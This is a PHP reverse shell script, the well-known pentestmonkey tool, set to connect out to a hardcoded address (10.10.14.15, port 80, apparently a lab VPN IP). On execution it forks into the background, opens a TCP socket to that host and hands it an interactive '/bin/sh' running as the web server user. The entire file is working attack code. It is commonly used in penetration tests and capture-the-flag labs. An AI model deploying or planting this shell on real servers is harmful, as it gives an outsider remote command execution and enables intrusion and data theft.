<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only. Users take full responsibility
// for any actions performed using this tool. The author accepts no liability
// for damage caused by this tool. If these terms are not acceptable to you, then
// do not use this tool.
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).

set_time_limit(0); // Remove time limits
$ip = '10.10.14.15';  // <-- Your IP address (tun0)
$port = 80;           // <-- Use port 80
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i'; // Command to run when shell is received
$daemon = 0;
$debug = 0;

// Try to daemonise the process (avoid zombies)
if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    
    if ($pid == -1) {
        exit(1); // Fork failed
    }
    
    if ($pid) {
        exit(0); // Parent exits, child continues
    }

    if (posix_setsid() == -1) {
        exit(1); // Become session leader failed
    }

    $daemon = 1;
}

// Change to safe directory
chdir("/");

// Remove any inherited umask
umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    exit(1);
}

// Create pipes for process interaction
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin
   1 => array("pipe", "w"),  // stdout
   2 => array("pipe", "w")   // stderr
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    exit(1);
}

// Set non-blocking mode
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

// Main loop to forward traffic
while (1) {
    if (feof($sock) || feof($pipes[1])) {
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        $output = fread($pipes[1], $chunk_size);
        fwrite($sock, $output);
    }

    if (in_array($pipes[2], $read_a)) {
        $error_output = fread($pipes[2], $chunk_size);
        fwrite($sock, $error_output);
    }
}

// Close everything
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

?>
